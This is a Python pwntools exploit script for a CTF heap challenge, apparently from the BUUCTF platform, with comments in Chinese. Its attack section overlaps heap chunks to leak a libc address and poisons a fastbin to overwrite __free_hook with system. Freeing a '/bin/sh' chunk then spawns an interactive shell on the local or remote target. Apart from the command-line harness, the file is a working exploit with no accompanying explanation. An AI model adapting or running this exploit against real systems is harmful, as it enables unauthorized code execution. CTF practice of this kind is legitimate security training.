from pwn import *
from LibcSearcher import LibcSearcher
import click
import sys
import os
import time

FILENAME = '#' # 要执行的文件名
DEBUG = 1 # 是否为调试模式
TMUX = 0 # 是否开启TMUX
GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置
IP = None # 远程连接的IP
PORT = None # 远程连接的端口
LOCAL_LOG = 1 # 本地LOG是否开启
PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置
STOP_FUNCTION = 1 # STOP方法是否开启


CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!')
@click.argument('filename', nargs=1, type=str, required=0, default=None)
@click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.')
@click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.')
@click.option('-gb', '--gdb-breakpoint', default=None, type=str, help='Set a gdb breakpoint while tmux is enabled, is a hex address or a function name. Default value:None')
@click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.')
@click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.')
@click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.')
@click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.')
@click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.')
def parse_command_args(filename, debug, tmux, gdb_breakpoint, ip, 
                       port, local_log, pwn_log, stop_function):
    '''FILENAME: The filename of current directory to pwn'''
    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION
    # assign
    FILENAME = filename
    DEBUG = debug
    TMUX = tmux
    GDB_BREAKPOINT = gdb_breakpoint
    IP = ip
    PORT = port
    LOCAL_LOG = local_log
    PWN_LOG_LEVEL = pwn_log
    STOP_FUNCTION = stop_function
    # print('[&]', filename, debug, tmux, gdb_breakpoint, ip, port, local_log, pwn_log, stop_function)
    # change
    if PORT:
        DEBUG = 0
        TMUX = 0
        STOP_FUNCTION = 0
        GDB_BREAKPOINT = None
        if IP is None:
            IP = 'node3.buuoj.cn'
    
    if DEBUG:
        IP = None
        PORT = None
    
    # assert
    assert not (FILENAME is None and PORT is None), 'para error'
    assert not (FILENAME is None and DEBUG == 1), 'para error'
    assert not (PORT is not None and DEBUG == 1), 'para error'
    assert not (DEBUG == 0 and TMUX == 1), 'para error'
    
    # print
    click.echo('=' * 50)
    click.echo(' [+] Args info:\n')
    if FILENAME:
        click.echo('  filename: %s' % FILENAME)
    click.echo('  debug enabled: %d' % DEBUG)
    click.echo('  tmux enabled: %d' % TMUX)
    if GDB_BREAKPOINT:
        click.echo('  gdb breakpoint: %s' % GDB_BREAKPOINT)
    if IP:
        click.echo('  remote ip: %s' % IP)
    if PORT:
        click.echo('  remote port: %d' % PORT)
    click.echo('  local log enabled: %d' % LOCAL_LOG)
    click.echo('  pwn log_level: %s' % PWN_LOG_LEVEL)
    click.echo('  stop function enabled: %d' % STOP_FUNCTION)
    click.echo('=' * 50)
    

parse_command_args.main(standalone_mode=False)

if len(sys.argv) == 2 and sys.argv[1] == '--help':
    sys.exit(0)

if DEBUG:
    io = process('./{}'.format(FILENAME))
else:
    io = remote(IP, PORT)

if TMUX:
    context.update(terminal=['tmux', 'splitw', '-h'])
    if GDB_BREAKPOINT is None:
        gdb.attach(io)
    elif '0x' in GDB_BREAKPOINT:
        gdb.attach(io, gdbscript='b *{}\nc\n'.format(GDB_BREAKPOINT))
    else:
        gdb.attach(io, gdbscript='b {}\nc\n'.format(GDB_BREAKPOINT))


if FILENAME:
    cur_elf = ELF('./{}'.format(FILENAME))
    print('[+] libc used ===> {}'.format(cur_elf.libc))

def LOG_ADDR(addr_name:str, addr:int):
    if LOCAL_LOG:
        log.success("{} ===> {}".format(addr_name, hex(addr)))
    else:
        pass

STOP_COUNT = 0
def STOP(idx:int=-1):
    if not STOP_FUNCTION:
        return
    if idx != -1:
        input("stop...{} {}".format(idx, proc.pidof(io)))
    else:
        global STOP_COUNT
        input("stop...{}  {}".format(STOP_COUNT, proc.pidof(io)))
        STOP_COUNT += 1


context.update(os='linux', log_level=PWN_LOG_LEVEL, arch='amd64')
##########################################
##############以下为攻击代码###############
##########################################

# ubuntu16 unlink

def show_item():
    global io
    io.sendlineafter("Your choice:", '1')
    return io.recvuntil("----------------------------\n")

def add_item(item_len:int, name:bytes=b'\x00'):
    global io
    io.sendlineafter("Your choice:", '2')
    io.sendlineafter("Please enter the length of item name:", str(item_len))
    io.sendafter("Please enter the name of item:", name)

def change_item(idx:int, item_len:int, name:bytes=b'\x00'):
    global io
    io.sendlineafter("Your choice:", '3')
    io.sendlineafter("Please enter the index of item:", str(idx))
    io.sendlineafter("Please enter the length of item name:", str(item_len))
    io.sendafter("Please enter the new name of the item:", name)

def remove_item(idx:int):
    global io
    io.sendlineafter("Your choice:", '4')
    io.sendlineafter("Please enter the index of item:", str(idx))
    io.recvuntil("remove successful!!\n")

# 1. fastbin attack
add_item(0x10) # 0
add_item(0x60) # 1
add_item(0x10) # 2
add_item(0x20) # 3
add_item(0x20, b'/bin/sh\x00') # 4
add_item(0x20) # 5

# extend overlapping

payload = p64(0) * 3 + p64(0x91)
change_item(0, len(payload), payload)

remove_item(1)

add_item(0x60) # 1
msg = show_item()
print(msg)
leak_addr = msg[12:18]
main_arena_addr = u64(leak_addr.ljust(8, b'\x00')) - 88

if DEBUG:
    libc_base_addr = main_arena_addr - 0x3c3b20
    system_addr = libc_base_addr + 0x45380
    free_hook_addr = libc_base_addr + 0x3c57a8
else:
    libc_base_addr = main_arena_addr - 0x3c4b20
    system_addr = libc_base_addr + 0x45390
    free_hook_addr = libc_base_addr + 0x3c67a8

LOG_ADDR('libc_base_addr', libc_base_addr)

target_addr = 0x6020e8
remove_item(2)

payload = 0x68 * b'a' + p64(0x21) + p64(target_addr)
change_item(1, len(payload), payload)

add_item(0x10) # 2

add_item(0x10) # 6

# change_item(6, 0x8, p64(cur_elf.got['free']))
change_item(6, 0x8, p64(free_hook_addr))
# STOP(0)
change_item(3, 0x8, p64(system_addr))

io.sendlineafter("Your choice:", '4')
io.sendlineafter("Please enter the index of item:", str(4))

io.interactive()



